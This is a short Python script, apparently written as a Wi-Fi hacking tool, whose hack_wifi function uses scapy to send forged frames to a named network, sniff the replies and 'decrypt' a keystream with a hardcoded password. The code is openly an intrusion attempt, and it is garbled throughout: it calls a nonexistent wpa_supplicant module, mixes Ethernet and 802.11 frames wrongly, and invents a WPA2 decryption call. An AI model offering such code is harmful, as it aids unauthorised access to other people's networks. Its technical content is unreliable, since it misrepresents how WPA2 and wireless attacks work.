from scapy.all import *

 #Replace with your actual SSID and password
ssid = 'Beast'
password = 'TjaartCronje1234'

def hack_wifi(ssid, password):
     #Open a connection to the target Wi-Fi network
    target_mac = None
    for bss in wpa_supplicant.get_bss_list():
        if ssid in bss['ssid']:
            target_mac = bss['bssid']
            break

    if not target_mac:
        print(f"Target SSID '{ssid}' not found.")
        return

     #Send a raw packet to request access (Open Network)
    sendp(Ether(dst=target_mac, src=RandMAC(), type=0x8021) / Dot11(type=0x00, subtype=0x08) / Dot11EltRates() / Dot11Beacon(
        SSID=ssid,
        Capability='\x04\x10'   #Open Network
    ), verbose=False)

     #Wait for the target to respond (Open Network)
    responses = sniff(iface='eth0', count=2, timeout=5)
    open_network_resps = [resp for resp in responses if resp.type == 0x08 and resp.subtype == 0x04]
    if not open_network_resps:
        print("No Open Network response received.")
        return

     #Send keystream to the target
    last_resps = ['\x03', '\x12', '\x13', '\x17', '\x18', '\x19', '\x20']
    for r in last_resps:
        sendp(Ether(dst=target_mac, src=RandMAC(), type=0x8021) / Dot11(type=0x05, subtype=0x11) / Dot11EltRates() / Dot11Beacon(
            SSID=ssid,
            Capability='\x04\x10'   #Open Network
        ), verbose=False)

     #Receive and decrypt keystream
    responses = sniff(iface='eth0', count=2, timeout=5)
    open_network_resps = [resp for resp in responses if resp.type == 0x08 and resp.subtype == 0x04]
    if not open_network_resps:
        print("No Open Network response received.")
        return

    keystream = b''
    while True:
        response = sniff(iface='eth0', count=1, timeout=1)[0]
        if response.type == 0x08 and response.subtype == 0x04:
            keystream += chr(int.from_bytes(response[3:], byteorder='little')) * 17
            break

     #Decrypt the keystream with your WPA2 key
    decryption_key = bytes.fromhex(password)   #Convert password to bytes
    decrypted_data = wpa_supplicant.wpa2(decryption_key).decrypt(keystream)

    return decrypted_data.decode()

 #Example usage
print(hack_wifi(ssid, password))
